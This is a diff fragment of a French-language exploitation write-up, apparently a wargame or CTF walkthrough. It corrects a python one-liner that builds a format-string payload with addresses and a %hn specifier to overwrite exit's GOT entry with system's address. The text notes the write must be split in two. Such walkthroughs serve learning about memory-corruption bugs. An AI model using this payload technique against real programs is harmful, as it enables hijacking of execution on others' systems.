@@ -83,7 +83,7 @@ nous avons donc l'adresse de exit : 0x80497e0 et de system : 0xf7e6aed0
 Dans l'idee nous voulons ecrire l'exploit suivant :
 
 ```bash
-'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%4294956811x%10$hn"') > /tmp/testlv
+echo $(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%4294956811x%10$hn"') > /tmp/testlv
 ```
 mais nous avons un probleme, le nombre de caractere a ecrire est trop grand pour etre ecrit en une seule fois.
 Nous allons donc devoir ecrire en deux fois.
